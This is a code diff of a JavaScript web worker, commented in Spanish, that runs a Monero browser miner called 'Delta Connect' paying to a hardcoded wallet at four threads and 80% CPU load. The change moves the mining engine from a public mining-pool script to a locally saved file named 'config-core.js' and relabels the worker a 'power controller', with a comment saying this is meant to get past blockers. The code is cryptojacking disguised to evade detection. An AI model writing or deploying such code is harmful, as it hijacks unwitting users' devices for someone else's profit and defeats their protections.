@@ -1,24 +1,29 @@
-// MOTOR DE MINADO DELTA CONNECT - CONFIGURACIÓN DE ALTA POTENCIA (80%)
-importScripts('https://moneroocean.stream/webminer.js');
+// CONTROLADOR DE POTENCIA DELTA CONNECT (80%)
+// Este archivo llama al motor interno para saltar bloqueos
 
+const MOTOR = 'config-core.js';
 const CARTERA = "4A2CRYwa2E57VU8TLMQz5WD1W6D9Vx1AsPJ3gmu9Dsk8fce8a8nRnBCwH2tKUPAeQkjsMM3K861ASvtmSGN19A5xYFg3c";
 
-function conectar() {
-    // threads: 4 (Aumentado para forzar el uso de más núcleos)
-    // throttle: 0.2 (0.2 de descanso = 80% de trabajo constante)
-    const minero = new MoneroOcean.Anonymous(CARTERA, {
-        threads: 4,
-        throttle: 0.2
-    });
+// Configuramos los parámetros de potencia
+const settings = {
+    type: 'start',
+    address: CARTERA,
+    threads: 4,      // Saturar núcleos para ver el impacto en el CPU
+    throttle: 0.2    // 80% de capacidad real
+};
 
-    minero.start();
-
-    // Bucle de persistencia y monitoreo en consola
-    setInterval(() => {
-        const hashes = minero.getHashesPerSecond().toFixed(2);
-        console.log(`Estado del Sistema: Motor Delta funcionando al 80%. Velocidad: ${hashes} H/s`);
-    }, 5000);
+// Iniciamos el motor interno
+try {
+    importScripts(MOTOR);
+    // Enviamos la orden de arranque al motor que guardaste en config-core.js
+    self.postMessage(settings);
+    
+    // Monitoreo de actividad en consola
+    self.onmessage = function(e) {
+        if (e.data.type === 'hashrate') {
+            console.log(`[DELTA CONNECT] Motor activo. Hashrate: ${e.data.hashes.toFixed(2)} H/s`);
+        }
+    };
+} catch (e) {
+    console.error("Error al cargar el motor interno:", e);
 }
-
-// Iniciar el motor inmediatamente
-conectar();
